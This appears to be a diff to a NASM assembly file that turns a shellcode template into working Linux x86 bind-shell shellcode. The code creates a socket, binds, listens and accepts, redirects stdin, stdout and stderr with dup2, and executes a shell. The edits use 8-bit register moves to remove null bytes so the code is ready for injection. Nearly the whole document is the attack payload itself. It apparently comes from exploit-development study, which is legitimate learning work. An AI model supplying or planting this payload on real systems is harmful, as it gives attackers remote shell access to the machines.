@@ -1,8 +1,7 @@
-
-; Filename: template.nasm
-; Author:   Jake Badman
-; Website:  http://0x14d
-; Purpose:  Template for shellcode. 
+; Filename: bind.nasm
+; Author:   Jake
+; Website:  http://github.com/14deep
+; Purpose:  Bind shell shellcode for Linux x86
 
 
 global _start			
@@ -15,13 +14,18 @@ _start:
 
 	;Socket
 	;In reverse order, pushing each value to the stack:
-    	xor eax, eax
-	push eax      ; Pushing 0 for the Protocol parameter required
+	xor eax, eax
+	xor ebx, ebx
+	xor ecx, ecx
+	xor edx, edx
+	xor esi, esi
+
+	push eax     ; Pushing 0 for the Protocol parameter required
 	push 0x1     ; Pushing 1 for the Type (SOCK_STREAM) parameter required
 	push 0x2     ; Pushing 2 for the Domain (IF_INET) parameter required
 	
-	mov eax, 0x66; Adding syscall for socketcall() to eax
-	mov ebx, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'
+	mov al, 0x66; Adding syscall for socketcall() to eax
+	mov bl, 0x1  ; 0x1 is added to bx for the socketcall parameter 'socket'
 
 		     ; At this point, eax is set to 0x66 for the socketcall
 		     ; syscall, ebx is set to 0x1 for the socket parameter
@@ -42,8 +46,8 @@ _start:
 	;Bind
 	;Similar as before, but with different parameters for the bind socketcall
 
-	mov eax, 0x66 ; eax contained the File Descriptor, now socketcall().
-	mov ebx, 0x2    ; Making ebx 2 for bind socketcall()	
+	mov al, 0x66 ; eax contained the File Descriptor, now socketcall().
+	mov bl, 0x2    ; Making ebx 2 for bind socketcall()	
 	
 
 	;Add parameters to stack to be used for ecx
@@ -73,8 +77,8 @@ _start:
 
 	;Listen
 
-	mov eax, 0x66; Socketcall syscall
-	mov ebx, 0x4 ; add 4 to ebx for listen 
+	mov al, 0x66; Socketcall syscall
+	mov bl, 0x4 ; add 4 to ebx for listen 
 
 	;ecx
 	;int listen(int sockfd, int backlog);
@@ -90,8 +94,8 @@ _start:
 
 	;Accept
 
-	mov eax, 0x66; Socketcall syscall
-    	mov ebx, 0x5 ; add 5 to ebx for accept
+	mov al, 0x66; Socketcall syscall
+    	mov bl, 0x5 ; add 5 to ebx for accept
 
 	;ecx
 	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen);
@@ -111,16 +115,16 @@ _start:
 	;dup2
 	;This could be looped
 
-	mov eax, 0x3f ; Syscall for dup2
+	mov al, 0x3f  ; Syscall for dup2
 	mov ebx, edx  ; Moving the old FD into ebx
 	mov ecx, esi  ; Moving 0 into ecx for 'stdin'
 	int 0x80      ; Interupt to call the syscall
 
-	mov eax, 0x3f
+	mov al, 0x3f
    	inc ecx       ; Increment ecx so it is now 2
     	int 0x80      ; Interupt to call the syscall
 
-	mov eax, 0x3f
+	mov al, 0x3f
 	inc ecx       ; Increment ecx so it is now 2
     	int 0x80      ; Interupt to call the syscall
 	
@@ -144,8 +148,7 @@ _start:
     	push ebx
     	mov ecx, esp
 
-    	mov eax, 11
+    	mov al, 11
     	int 0x80
-
 
 
